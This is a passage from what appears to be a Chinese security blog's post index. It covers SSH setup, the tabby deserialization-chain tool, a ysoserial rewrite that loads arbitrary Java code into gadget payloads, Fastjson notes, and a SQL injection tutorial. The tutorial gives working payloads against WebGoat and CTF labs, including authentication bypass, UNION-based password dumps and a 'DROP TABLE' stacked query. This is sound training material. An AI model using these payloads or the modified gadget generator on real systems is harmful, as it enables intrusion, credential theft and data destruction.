man:sshd_config(5)\n\n0x02 可能出现的问题1. 当用ssh进行连接时ssh withdraw@192.168.241.136\n\n\n报错了\n\nssh: connect to host 192.168.241.136 port 22: Connection refused\n\n如果我们根据0x01的解决方法，\nservice ssh status------------>service ssh start\n\n2. 出现了新型报错！ssh: Could not resolve hostname service: \\262\\273\\326\\252\\265\\300\\325\\342\\321\\371\\265\\304\\326\\367\\273\\372\\241\\243\n\n 思来想去搞了半天，最终终于是解决了\n先尝试了用物理机ping虚拟机\nping 192.168.241.136\n\n\n\n\n原因是虚拟机vmnet08的网段和物理机不在同一网段下\n\nSolution One重启vmnet08的网卡。\nSolution Two\n  查看虚拟机nat设置（虚拟机菜单栏—&gt;编辑—&gt;网络适配器设置—&gt;选中nat—&gt;nat设置），以及虚拟机ip信息（ifconfig）\n\n\n\n再查看物理机VMware Network Adapter VMnet8配置（ipconfig）\n\n\n\n  显然与虚拟机的IP不在同一网段，我们修改VMware Network Adapter VMnet8的配置（之前是自动获取），让其与虚拟机在同一网段(打开网络和Internet设置—&gt;更改适配器选项—&gt;VMware Network Adapter VMnet8—&gt;属性—&gt;ipv4属性)\n\n\n\n\n再重启VMware Network Adapter VMnet8服务\n\n问题解决！\n\n\n3. 密码明明正确却无法用ssh登录好吧其实是在服务器上面弄的，以为服务器可以直接新建用户，然后通过用户来设置ssh账号的，结果发现是我想多了。应该是\nsudo useradd * (用户名)\n接着\nsudo passwd * (用户名)\n接着提示会让你输入密码\n\n登录成功~\n","categories":["环境搭建"],"tags":["环境搭建"]},{"title":"tabby 工具学习","url":"/2022/12/26/tabby-%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/","content":"tabby 工具学习\n\n0x01 前言看到很多师傅都通过 tabby 来分析 CTF 题目以及找链子，所以最近自己也学一学\n0x02 环境\n当时自己在搭建环境的时候大致是在 2022 年的 12 月底左右，然后搭建环境踩坑了接近半个月多一点，最终还是放弃了；不过在 2023.3.1 附近的时间，H3Q3 哥哥说他起 tabby 很快，在他的帮助下我终于是把新版本的 tabby 搭建起来了\n\ntabby 的项目地址 https://github.com/wh1t3p1g/tabby\n我们去到 releases 下，选择 v1.2.0-1 的版本，也就是目前最新版本（可能过一段时间也会变，不过这个版本似乎很稳定\n很不建议 IDEA 与 tabby 联动，我之前一直跑的有问题\n首先需要先配置 Neo4j 的环境，强烈建议用 Neo4j 5.x 的版本。apoc 的两个插件需要与数据库版本对应。Neo4j 的配置我这里就不重复了\nhttps://github.com/wh1t3p1g/tabby/blob/master/doc/Neo4j%20%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%20%20V5.md\n然后原作者说需要加上 tabby-path-finder 这个附加工具，加上这个是对的，但是无需把 neo4j.conf 当中的这一段修改\ndbms.security.procedures.unrestricted&#x3D;jwt.security.*,apoc.*    \n&#x2F;&#x2F; 这是正确的，不需要加上 ,.tabby\n\n将 neo4j 配置完毕之后需要在 tabby 里面配置一下 settings.properties，如下，就能够跑得起来了，若是有踩坑的地方欢迎师傅们和我交流\n# enables\ntabby.build.enable                        = true\ntabby.load.enable                         = true\ntabby.cache.compress                      = false\n# debug\ntabby.debug.details                       = true\n\n# jdk settings\ntabby.build.isJDKProcess                  = false\ntabby.build.withAllJDK                    = false\ntabby.build.excludeJDK                    = false\ntabby.build.isJDKOnly                     = false\n\n# dealing fatjar\ntabby.build.checkFatJar                   = true\n\n# pointed-to analysis\ntabby.build.isFullCallGraphCreate         = true\ntabby.build.thread.timeout                = 2\ntabby.build.isNeedToCreateIgnoreList      = false\n\n# targets to analyse\ntabby.build.target                        = cases/commons-collections-3.1.jar\ntabby.build.libraries                     = libs\ntabby.build.mode                          = gadget\n\n# db settings\n# tabby.cache.directory                     = ./cache\ntabby.cache.directory                     = ./env/import\ntabby.cache.db.filename                   = dev\ntabby.cache.isDockerImportPath            = false\ntabby.cache.auto.remove                   = true\ntabby.cache.compress.times                = 1\n\ntabby.neo4j.username                      = neo4j\ntabby.neo4j.password                      = password\ntabby.neo4j.url                           = bolt://127.0.0.1:7687\n\n按照上述步骤，应该是可以跑起来的\n0x03 neo4j 教程\n先说一说 neo4j 与 tabby 的关系，tabby 是一个将 jar 包中的信息提取出来，再到 neo4j 里面进行可视化的操作。这样可以让我们找反序列化的链子更加清晰快速\n\n简介\nMATCH ：要匹配的图形模式。这是从图表中获取数据的最常用方法。 \nWHERE: 本身不是一个子句，而是 MATCH , OPTIONAL MATCH 和的一部分 WITH 。向模式添加约束，或过滤通过 WITH \nRETURN : 返回什么。\n\n让我们使用以下查询创建一个简单的示例图\nCREATE (john:Person &#123;name: &#39;John&#39;&#125;)\nCREATE (joe:Person &#123;name: &#39;Joe&#39;&#125;)\nCREATE (steve:Person &#123;name: &#39;Steve&#39;&#125;)\nCREATE (sara:Person &#123;name: &#39;Sara&#39;&#125;)\nCREATE (maria:Person &#123;name: &#39;Maria&#39;&#125;)\nCREATE (john)-[:FRIEND]-&gt;(joe)-[:FRIEND]-&gt;(steve)\nCREATE (john)-[:FRIEND]-&gt;(sara)-[:FRIEND]-&gt;(maria)\n\n\n\n","categories":["工具开发&编写"],"tags":["工具开发&编写"]},{"title":"ysoserial 改写心得","url":"/2022/12/21/ysoserial-%E6%94%B9%E5%86%99%E5%BF%83%E5%BE%97/","content":"ysoserial 改写心得\n\n0x01 前言终于还是要对这玩意儿动手了啊，自己打算从 0.9 到 1 完成改写，不看其他师傅的文章，进行独立分析。（最后还是参考了哈哈哈，我太菜了）\n0x02 结构&#x2F;代码分析\n\n几个文件夹，先看 payloads\n\npayloads 文件夹\n\npayloads 文件夹里面是我们平常写的 EXP，运行如图\n\n\n并且它会打印如下语句\n\n\n这里的 calc.exe 实际上是因为在 ysoserial.payloads.util 的 PayloadRunner 类中的 getDefaultTestCmd 方法，定义了最开始的值。\n\n\n\nutil 文件夹\n\n里面都是一些工具类，比如在 Gadgets 类里面，有创建字节码，创建动态代理的方法。\n\n\n\nAnnotation 文件夹\n\n里面是一些声明，比如 Authors 这些\n\nexploit 文件夹\n\n里面放了一些直接调用的 EXP\n\n文件夹外的几个类\n\nGeneratePayload.java 生成 poc 的入口函数Deserializer.java 反序列化模块Serializer.java 序列化模块Strings.java 字符处理模块\n0x03 改写 yso 的出发点改写1、将原本的命令执行 payload 变成写入内存马。2、解决 shiro550 serializeID 不一样的问题。\n首先在 Gadgets 类里面，有这么一段话\nTODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections\n\n\n\n此处本身是命令执行的方式 Runtime.getRuntime.exec(&quot;cmd&quot;)，这一定并非是我们最想要的，所以要将其进行改写，把命令执行的方式改成执行代码块的方式，先从简单的弹 shell 开始，到后面打内存马。\n参考 c0ny1 师傅的文章 http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/\n我这边添加了四种方式\n\n\n\n序号\n方式\n描述\n\n\n\n\n1\n“code:代码内容”\n代码量比较少时采用\n\n\n2\n“codebase64:代码内容base64编码”\n防止代码中存在但引号，双引号，&amp;等字符与控制台命令冲突。\n\n\n3\n“codefile:代码文件路径”\n代码量比较多时采用\n\n\n4\n“classfile:class路径“\n利用已生成好的 class 直接获取其字节码\n\n\n\n\n通过在输入的 command 前添加前缀，根据不同前缀进行不同的处理方式\n这其中 code codebase codefile 前缀的都是插入代码，然后动态生成 templates\nclassfile 则是直接读取 class 文件中的字节码动态生成 templates（感觉实际情况里面用到这种相当多）\n\n所以其实 ysoserial 的初步改写就是去改写这一段内容，进行 cmd 的不同程度的利用即可。\n\n先写一个 CmdUtils，用来处理字节码，以及 .class 类型的文件\npackage ysoserial.payloads.util;  \n  \nimport java.io.*;  \n  \npublic class CmdUtils &#123;  \n  \n    public static String readStringFromInputStream(InputStream inputStream) throws Exception&#123;  \n        StringBuilder stringBuilder = new StringBuilder(\"\");  \n        byte[] bytes = new byte[1024];  \n        int n = 0;  \n        while ((n=inputStream.read(bytes)) != -1)&#123;  \n            stringBuilder.append(new String(bytes,0,n));  \n        &#125;  \n        return stringBuilder.toString();  \n    &#125;  \n  \n    public static byte[] getBytes(String path) throws Exception&#123;  \n        InputStream inputStream = new FileInputStream(path);  \n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  \n        int n = 0;  \n        while ((n=inputStream.read())!=-1)&#123;  \n            byteArrayOutputStream.write(n);  \n        &#125;  \n        byte[] bytes = byteArrayOutputStream.toByteArray();  \n        return bytes;  \n    &#125;  \n  \n  \n    public static byte[] readClassByte(String filename) throws IOException&#123;  \n        File f = new File(filename);  \n        if (!f.exists()) &#123;  \n            throw new FileNotFoundException(filename);  \n        &#125;  \n        ByteArrayOutputStream bos = new ByteArrayOutputStream((int) f.length());  \n        BufferedInputStream in = null;  \n        try &#123;  \n            in = new BufferedInputStream(new FileInputStream(f));  \n            int buf_size = 1024;  \n            byte[] buffer = new byte[buf_size];  \n            int len = 0;  \n            while (-1 != (len = in.read(buffer, 0, buf_size))) &#123;  \n                bos.write(buffer, 0, len);  \n            &#125;  \n            return bos.toByteArray();  \n        &#125; catch (IOException e) &#123;  \n            e.printStackTrace();  \n            throw e;  \n        &#125; finally &#123;  \n            try &#123;  \n                in.close();  \n            &#125; catch (IOException e) &#123;  \n                e.printStackTrace();  \n            &#125;  \n            bos.close();  \n        &#125;  \n    &#125;  \n  \n    public static String getCodeFile(String codefile) &#123;  \n        try&#123;  \n            File file = new File(codefile);  \n            if (file.exists())&#123;  \n                FileReader reader = new FileReader(file);  \n                BufferedReader bufferedReader = new BufferedReader(reader);  \n                StringBuilder sb = new StringBuilder(\"\");  \n                String line = \"\";  \n                while ((line=bufferedReader.readLine()) != null)&#123;  \n                    sb.append(line);  \n                    sb.append(\"\\r\\n\");  \n                &#125;  \n                return sb.toString();  \n            &#125; else &#123;  \n                System.err.println(String.format(\"[-] %s is not exists!\",codefile));  \n                System.exit(0);  \n                return null;  \n            &#125;  \n        &#125; catch (Exception e)&#123;  \n            e.printStackTrace();  \n            return null;  \n        &#125;  \n    &#125;  \n&#125;\n\n接着改写 Gadgets 类，增添如下代码\nbyte[] classBytes = null;  \nString cmd = \"\";  \nif (command.startsWith(\"code:\"))&#123;  \n    cmd = command.substring(5);  \n&#125; else if (command.startsWith(\"codebase64:\"))&#123;  \n    byte[] decode = new BASE64Decoder().decodeBuffer(command.substring(11));  \n    cmd = new String(decode);  \n&#125; else if (command.startsWith(\"codefile:\"))&#123;  \n    String codefile = command.substring(9);  \n    cmd = CmdUtils.getCodeFile(codefile);  \n    // 指定了 class文件之后 直接读取字节码  \n&#125; else if (command.startsWith(\"classfile:\"))&#123;  \n    String classfile = command.substring(10);  \n    classBytes = CmdUtils.readClassByte(classfile);  \n    Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][] &#123;classBytes&#125;);  \n    Reflections.setFieldValue(templates, \"_name\", \"Pwnr\");  \n    return templates;  \n&#125; else &#123;  \n    cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" +  \n        command.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") +  \n        \"\\\");\";  \n&#125;  \nclazz.makeClassInitializer().insertAfter(cmd);  \nclazz.setName(\"ysoserial.Pwner\" + System.nanoTime());  \nCtClass superC = pool.get(abstTranslet.getName());  \nclazz.setSuperclass(superC);\n\n至此，我们基本的需求是没问题了，但是还差很多，比如 shiro550 的内存马，比如 SerialVersionID 的问题，比如 Tomcat Header 缩短的问题都亟待解决，\n解决问题Tomcat Header 的限制这个其实好解决，可以用之前在 《Java 回显技术》一文当中的缩短 Tomcat Shiro Header 的方法，此处不再提及，还有 Y4tacker 师傅分享的缩短 Header 的方法，挂个链接，之后再看。\nhttps://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/\n感觉自己开发基本功不好，暂且咕咕咕了。","categories":["工具开发&编写"],"tags":["工具开发&编写"]},{"title":"一些很重要的灵光一现与概念性的东西集合","url":"/2022/07/11/%E4%B8%80%E4%BA%9B%E5%BE%88%E9%87%8D%E8%A6%81%E7%9A%84%E7%81%B5%E5%85%89%E4%B8%80%E7%8E%B0%E4%B8%8E%E6%A6%82%E5%BF%B5%E6%80%A7%E7%9A%84%E4%B8%9C%E8%A5%BF%E9%9B%86%E5%90%88/","content":"是也不是\n\n关于 Java 反序列化的关于 readObject我们传进去的东西其实是已经被序列化的东西，比如在 Web 上面抓包，抓取的包是 json，这就是已经序列化了的代表。\n当我们执行反序列化操作的时候会自动进行 readObject() 方法，所以我们反序列化的入口类要求是必须能够序列化，且里面重写了 readObject() 方法。\nCC 链到底是干嘛的CC 链实际上是利用链的一部分，但是 CC 链这里没有什么好的入口类，所以打不了，是要与一些其他的，比如 shiro 呀，fastjson 呀，结合起来打的。\n一般链子的执行是如何实现的\n我自己在看 CC6 的复习的时候想到的这一点，到底是怎么实现的呢。\n\n看了一段简单的代码，dubug 了很久之后终于很明白了。\n先说反射，要讲反序列化漏洞，要从反射说起。\n反射这里，我们看最简单的一段代码。\npackage src.ReflectDemo;  \n  \nimport java.lang.reflect.Method;  \n  \npublic class ReflectionTest04 &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Class c1 = Class.forName(\"src.ReflectDemo.Person\");  \n Object m = c1.newInstance();  \n Method method = c1.getMethod(\"reflect\");  \n method.invoke(m);  \n &#125;  \n&#125;\n\n这样的，当我 debug 的时候：\nc1 就是我们获取的类，m 就是实例化 c1，也就是 c1.Class\n然后再获取 c1 中的方法，用 invoke 执行即可\n\n那么在 CC6 链当中呢\n\n\n这里没有实例化，我觉得有点奇怪，但是这里获取 method 方法，然后 invoke 执行是一样的！所以 CC6 之前那里！！！第二个参数总是为空！因为用不到！\n\n\n这和构造函数有关！原来如此！因为它的构造函数是 public，所以可以直接 new！终于想明白了！但是不知道为啥不用实例化，后来知道获取私有类是不需要 newInstance() 的，而且这样会报错。\n关于反射真的是常看常新，要多写 EXP，不然容易忘记\n要先实例化；反射可以获取到所有东西，绕过 private 的方式\nClass clazz = Class.forName(\"xxx\");\nObject o = method.invoke(clazz);  \nmethod.invoke(o);\n关于 Fastjson首先是原理，很重要\n设置 @type 的值，然后在反序列化的时候会自动去调用 [构造函数、getter、setter] 方法\n如果这些被调用的方法满足这些条件，而且有对应的漏洞点，就可以命令执行\n\n\n然后也是要结合链子的思维吧，确实牛逼。\n\n还有一个小点，要注意的。\n\n其实我们在反序列化的时候是不能把 @type 的值设置为抽象类的，一定是要去调用它的实现类的，也就是子类；这样一来，在反序列化的时候其实我们写的 @type 是一个子类，但是会自动去调用它的父类。参照例子可以是 Fastjson 1.2.62\ncheckAutoType() 函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList 为白名单（默认为空，可手动添加），denyList 为黑名单（默认不为空）。\n默认情况下，autoTypeSupport 为 False，即先进行黑名单过滤，遍历 denyList，如果引入的库以 denyList 中某个 deny 开头，就会抛出异常，中断运行。\ntrue: 先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤false: 先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错\n","categories":["碎碎念"],"tags":["碎碎念"]},{"title":"从0到1完全掌握 SQL 注入","url":"/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SQL-%E6%B3%A8%E5%85%A5/","content":"从0到1完全掌握 SQL 注入\n\n从0到1完全掌握 SQL 注入\n前言：本人算是三刷 SQL 注入了，最早开始学的时候并没有很好的掌握 SQL 语句。最近再重新刷一遍，巩固一遍知识。\n建议使用的配套靶场是 WebGoat、BUUCTF 以及 CTFhub。第一遍学的时候用的是 sqli-labs，但总觉得少了点味道。\n\n0x01 SQL？SQL 注入？\n所以到底什么是 SQL？到底什么是 SQL 注入？\nSQL：全称** Structured Query Language**，是一门专用于数据库的编程语言。那么 SQL 注入就是基于 SQL 语句的攻击啦~\n\n\n说到这儿，小白还是很迷糊的，那所以 SQL 注入有什么用呢？\n面向老手：之前打过 CTF 的小伙伴们都应该尝试过，使用 SQL 注入爆得数据库信息的经历吧。\n面向小白：我们先不讲原理，通过几道靶场体验一下 SQL 注入。\n\nT1：题目链接：2019极客大挑战 EasySQL启动题目容器后，直接输入 payload：在用户名处输入：\n1' union select 1,2,3 #\n密码随意输入，我这里输入的是 123\n\n\nT2：题目链接：2019极客大挑战 LoveSQL启动题目容器后，直接输入 payload：在用户名处输入：\n1' union select 1,2,group_concat(password) from l0ve1ysq1 #\n密码随意输入，可以还是输入123这里就得到了 flag\n\n\nSQL 注入到底能做什么？\n根据上面的 CTF 靶场例题** ^ ^  是不是挺明显的了~ SQL 注入可以爆得数据库的一些数据信息。**\n严重的 SQL 注入还可以 getshell。\n篡改数据库的数据 ———— 通过获得权限后的增删改查。\n挂黑页。\n\n\n小伙伴们也都初步体验过 SQL 注入了，接下来我们好好从基础开始讲，要真正学会 SQL 注入，就一定要先学会 SQL 语法。\n0x02 数据库之间的关系在正式讲 SQL 语句之前，我们需要明确一下数据库(database)，数据表(table)，数据库管理系统三者的关系。这个非常重要！！！！\n数据库管理系统 –管理着数据库—&gt; 数据库(database) –管理着数据表—&gt; 数据表(table) –管理着数据—&gt; 数据被存放在每行每列(colunms)中。 \n\n\n在 MySQL 下，存在一个默认的数据库，名为 “Information_schema”，一般后续的 SQL 注入都是存在三步走的关系，这里以联合注入为例\n\n爆数据库1’ union select database(),1 # &#x2F;&#x2F; 具体情况根据字段数来\n\n得到数据库的名为 pikachu，接着下一步爆表，爆表一般都是 table_schema\n\n\n爆数据表1’ union select table_schema,table_name from information_schema.tables where table_schema&#x3D;’pikachu’ #  \n&#x3D;》 这里的 pikachu 是爆出来的数据库名，如果数据名是另外其他的，替代进即可\n\n得到许多个其他的数据表，接着就查询字段即可\n\n\n查字段\n1’ union select group_concat(column_name1),group_concat(column_name2) from information_schema.columns where table_name&#x3D;’爆出来的表名’  &#x2F;&#x2F; 用上述爆出来的表名\n\n\n查数据1’ union select 2,group_concat(column_name) from ‘爆出来的表名’\n\n0x03 SQL 语句为什么输入上文一样的 payload 就可以爆得那些数据了呢？不要着急~ 万丈高楼平地起，我们先从基础开始看。SQL 语言还是特别人性化的，语句的语法和英语的语法十分相似。\nSQL 语句并不区分大小写，根据功能分为四种，它们分别是：1. DML (Data Manipulation Language)：数据操作语言，用于执行查询的语法。例如增删改查SELECT - 选择数据\nUPDATE - 更新数据\nDELETE - 删除数据\nINSERT INTO - 插入数据\n\n2. DDL (Data Definition Language)：数据定义语言，创建或删除表格，定义索引等。例如CREATE DATABASE - 创建新数据库\nALTER DATABASE - 修改数据库\nCREATE TABLE - 创建新表\nALTER TABLE - 变更（改变）数据库表\nDROP TABLE - 删除表\nCREATE INDEX - 创建索引（搜索键）\nDROP INDEX - 删除索引\n\n3. DCL (Data Control Language)：数据库控制语言，授权，角色控制等，事关权限，不可小觑。例如GRANT - 授权(一般是授权操作:如增删改查)  \nREVOKE - 取消授权\n\n4. TCL (Transaction Control Language)：事务控制语言，例如SAVEPOINT - 设置保存点  \nROLLBACK  - 回滚  \nSET TRANSACTION - 设置事务\n\n学习安全有时要做到事无巨细，这么多的 SQL 语句看到就足以让人头皮一麻了，这儿我们主要关注一个 SQL 语句——————** SELECT** ，SELECT 语句是产生 SQL 注入的罪魁祸首。\nSELECT 语句的基本语法：在数据表里面取数据\nSELECT * from table_name;  // 基本语法\nSELECT phone from employees where userid=96134; 从employees表当中选择 userid = 96134 的 phone 信息\n\n0x04 初窥 SQL 注入\n记住这句话，SQL 注入的本质是 SQL 语句的闭合。\n\n上节说到 SELECT 语句是产生 SQL 注入的罪魁祸首，我们再来深度剖析一下 SQL 语句中的 SELECT 语句。\n我们以 WebGoat 提供的环境作为靶场，这样也省去了搭建靶场的时间。\n\nSQL 语句的查询语句\n\"SELECT * FROM users WHERE name = ''\";\n\n在框内输入 123，查看变化\n\n把 SQL 语句单独拉出来再看一看，这不就是在 users 表中选择 name &#x3D; 123 的用户么~ 好理解吧~\n\"SELECT * FROM users WHERE name = '123'\";\n\n但是！在实际环境当中，自己需要登录进 web 页面，但却不知道用户名和密码时，123 作为用户名大概率是错误的。若服务器对 SQL 语言未进行任何限制：\n\n由此，这里向大家介绍第一个最基础的 SQL 注入攻击：万能密码\npayload:\n\n123' or '1'='1\n\n\nname &#x3D; ‘123’ or ‘1’&#x3D;’1’ 这一段语句永远为真，若服务器后端未对 SQL 语句进行任意过滤，那么攻击者就成功地实现了绕过。\n1. SQL 注入攻击之万能密码配套靶场：WebGoat，WebGoat的搭建可以移步至我的博客下学习—————— 一文解决搭建WebGoat的所有问题选择 Injection 界面下的 SQL Injection(intro) Lesson9\n\n\n\n题目里面告诉了我们 SQL 查询语句\n\n\"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '\" + lastName + \"'\";\n这里我们选择 Smith’ or ‘1’&#x3D;’1,成功~\n\n\n得到的 SQL 语句：\nSELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'\n因为此处 last_name 等于 **’Smith’ or ‘1’&#x3D;’1’**永远为真，原本的 SQL 语句也就等价于\nSELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or TRUE\n而所有的数据对于 **last_name&#x3D;TRUE **都成立，故可以查询出所有的数据。\n2. SQL 注入攻击之数字型注入\n所谓数字型注入即参数为数字，不需要添加其他符号来做闭合，如 id=1 or 1=1 的形式\n\n测试数字型注入的步骤：(1) 加单引号，id&#x3D;3’对应的sql：select * from table where id&#x3D;3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；\n(2) 加 and 1&#x3D;1，id&#x3D;3 and 1&#x3D;1对应的sql：select * from table where id&#x3D;3’ and 1&#x3D;1 语句执行正常，与原始页面如任何差异；\n(3) 加and 1&#x3D;2，id&#x3D;3 and 1&#x3D;2对应的sql：select * from table where id&#x3D;3 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异\n如果满足以上三点，则可以判断该URL存在数字型注入。\n靶场：WebGoat –&gt; Injection –&gt; SQL Injection (intro) –&gt; LessonPage10\n靶场界面如图所示\n\n\n\n题目已经给了 SQL 查询语句\n\n\"SELECT * FROM user_data WHERE login_count = \" + Login_Count + \" AND userid = \"  + User_ID;\n\n经过三步走，判断是否为数字型注入后，在 User_Id 中输入 1 or 1=1 —————进行最基本的数字型注入，查看回显。(这里如果在 Login_Count 下进行数字型注入会错误，原因可见WebGoat代码审计-02-SQL注入，是后端先进行了预编译)\n\n\n成功 ~ 我们再根据查询的 SQL 语句分析一遍逻辑\nSELECT * From user_data WHERE Login_Count = 123 and userid= 1 or 1=1\n\n这句 SQL 查询语句也等价于\nSELECT * From user_data WHERE Login_Count = 123 and userid=TRUE\n\n 也就是说，userid 永远都是 “TRUE”，所以爆出了所有的数据。\n3. SQL 注入攻击之字符型注入\n字符型注入也就是我们之前所说的 “万能密码”\n\n测试字符型注入的步骤：(1) 加单引号，id&#x3D;3’ and password&#x3D;123由于加单引号后变成三个单引号，则无法执行，程序会报错；一般的报错都是像这样。\nYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '123'' at line 1\n\n\n(2) 尝试绕过，通过 1’ or ‘1’&#x3D;’1\n过多就不再赘述，可以依照万能密码理解。\n\n0x05 UNION SELECT 联合注入1. 联合注入前的 PreparationPrepare① : SQL 语句当中的特殊符号(1) 常见注释符：\n行内注释符号/**/； 应用 —— /* 123 */，能够将123注释。\n行外注释符号 -- ；#; 应用 —— SELECT * FROM users WHERE name = &#39;admin&#39; -- AND pass = &#39;pass&#39;可以将 “–” 后的所有内容都注释掉。\n\n(2) 常见查询符：\n提供多组查询，也就是堆叠注入，符号为 ; 应用 —— SELECT * FROM users; DROP TABLE users;\n\n(3) 常见连接符：\n用于字符串的连接，单引号&#39;，加号+，管道符||， 应用 —— SELECT * FROM users WHERE name = &#39;+char(27) OR 1=1\n\nPrepare②: SQL UNION SELECT 联合查询\n联合查询的用法：\n\nSELECT first_name FROM user_system_data UNION SELECT login_count FROM user_data;\n这时候肯定有好多小伙伴要好奇问了，你说了这个联合查询，那联合查询没有任何限制吗？———————— 答案当然是有限制！\n在使用 UNION SELECT 联合查询之前，必须要先判断数据表有多少列，试想一下，如果数据表有三列，而 UNION SELECT 了四列，必然会导致报错。\nPrepare③: SQL UNION SELECT 的两个前提条件条件一、 SELECT 的列数与数据库的列数相等：举个栗子: 数据表有 3 列，那么 union 查询时的语句应该符合如下基本构造\n1' union select 1,2,3 #\n如果数据表有 4 列，构造如下\n1' union select 1,2,3,4 #\n\n条件二、 查询的数据要与原数据库列的数据类型匹配乍一眼看这段话是比较抽象的，我们还是简单举个例子。\n大家都知道，在新建数据库时，我们必须命名 table_name, column_name 以及 column_type ————这个东西就是数据库列的数据类型。\nCREATE TABLE Persons  \n(  \nPersonID int,  \nLastName varchar(255),  \nFirstName varchar(255),  \nAddress varchar(255),  \nCity varchar(255)  \n);\n\n对应这一个新的数据表 Persons，我们的联合查询应该如下\n1' union select 1,\"张三\",\"李四\",\"322111\",\"杭州\" #\n如果第一个数据输入的并不是 int 类型的数据的话，一定会遇到报错，我们这里用’1’作为例子。\nConversion failed when converting the varchar value '1' to data type int.\n\n\n\n那么问题又来了，当我们实战渗透，进行攻击的时候，肯定不知道对方的数据表有几列啊，这时应该怎么办呢？\n\nSolution1 通过 ORDER BY 命令假设是字符型注入\n' ORDER BY 1 --\n' ORDER BY 2 --\n' ORDER BY 3 --\netc.\n\nSolution2 通过 UNION SELECT NULL 来判断列数有多少个列，就写多少个 NULL\n' UNION SELECT NULL --\n' UNION SELECT NULL,NULL --\n' UNION SELECT NULL,NULL,NULL --\netc.\n\n特别需要注意的：在 Oracle 数据库中，需要改为\n\nUNION SELECT NULL FROM DUAL --\n\n\n好啦，该讲的知识点也都讲完了，是时候打靶场了~\n\n2. 靶场环境实战T1 靶场地址：WebGoat SQL Injection (advanced) PageLesson3靶场界面如图所示\n\n\n\n题目告诉我们已经存在的两个数据表 user_data 和 user_system_data\n两个任务：1. 从表中获取到所有的数据；2. 搞到 Dave 的密码。\n\n看到这个 Get Accout Info 的按钮，这和 Check Password的一定是分开的，那么我们先尝试闭合 SQL 语句，在第一个查询框内输入 1&#39; or &#39;1&#39;=&#39;1\n\n\n解法一、使用堆叠注入根据我们前文提到的堆叠注入，通过分号隔开两条 SQL 语句，payload：\n1'; select * from user_system_data -- \n\n\n由此，我们爆出了 user_system_data 表的数据，也得到了 Dave 的 password。但是 WebGoat 此时让我们再使用 UNION 查询来完成 SQL 注入。\n解法二、使用联合注入\n从之前的尝试中，我们发现使用万能密码注入时，返回的数据有七列。而 user_system_data 表只有4列，所以需要将从 user_system_data 表中查到的数据补齐到7列。\n7列数据： USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT\n目前 user_system_data 有4列：userid， user_name, password, cookie，将其补齐到7列。由此思考出 UNION SELECT 的数据：userid, user_name, password, null, null, cookie, null\n\n进一步构造 payload：\n1' or 1=1 union select userid,user_name,password,null,null,cookie,null from user_system_data --\n这样子我们可以爆出所有的数据\n\n\n还有一种只爆出 Dave password 的 payload，在这一种 payload 中，可以很明显地看出来 Union 联合查询要满足的第二个条件———————— 查询的数据要与原数据库列的数据类型匹配。\n1'or 1=1 union select 1,'2','3','4','5',password, 7 from user_system_data where user_name='dave'--\n\n\nT2：题目链接：2019极客大挑战 LoveSQL从这道靶场中可以看出联合查询的可用点，也就是不是每一个地方都是可以爆数据出来的。\n\n进入界面，输入一个数字1，查看 SQL 语句\n\n\n根据SQL语句的闭合，使用万能密码登录\n\n\nadmin' or '1'=1'\n\n\n但是再使用这个密码登录之后，发现还是同一个界面\n使用联合注入，发现报错\nadmin' union select 1,2,3,4#\n\n\n最后判断得到字段数为3\n\n\n发现2，3位置可被查询\n\n这里前面的 username 一定不能是 admin，一开始用 admin 一直不行，后面看了 WP 才改成了1\n\n1' union select 1,database(),3#\n\n\n发现数据库的名称为 geek，开始进一步查询\n1' union select 1,group_concat(table_name) where information_schema.tables where tables_schema='geek',3#\n\n结果得到报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '3 %23' and password='1'' at line 1\n\n尝试放到3字段中\n\n\n再进一步爆破column名\n\n\n只有一个 payload 检索出 flag\n1' union select 1,2,group_concat(password) from l0ve1ysq1\n\n0x06 Blind Injection 盲注在 WebGoat 网站上对盲注的英文描述机翻过来之后，比较不准确，这里分享一下自己的理解。\n1. 什么是 SQL 盲注\n首先 SQL 盲注很重要的一点是无回显\n其次 SQL 盲注存在非显性回显，也就是说从侧面可以看出回显\n\n\n展开来给大家讲一讲\n\nSQL 盲注的意思是，注入数据到 SQL 语句中，服务器不会返回数据库里的详细信息 ———————— 无回显的表现。\n只会给出 true 或 false 的信息，或者给出延时的信息，或者一些其他的信息(比如报错) ———————— 这里就是我所说的侧面回显。\n所以，我们只能根据有限的信息去获取数据库中更多地信息，这种方式像盲人摸象一样，只能一点一点的去收集数据库的信息（每一次的true表示获取一个有效信息），来慢慢形成对整个数据库信息的理解（表名是什么，列名是什么），最终达到获取数据库中数据的目的（获取某个表的某个值）。\n2. SQL 盲注的几种类型以及判断方法(1) 什么是 SQL 盲注\n首先 SQL 盲注很重要的一点是无回显\n其次 SQL 盲注存在非显性回显，也就是说从侧面可以看出回显\n\n\n展开来给大家讲一讲\n\nSQL 盲注的意思是，注入数据到 SQL 语句中，服务器不会返回数据库里的详细信息 ———————— 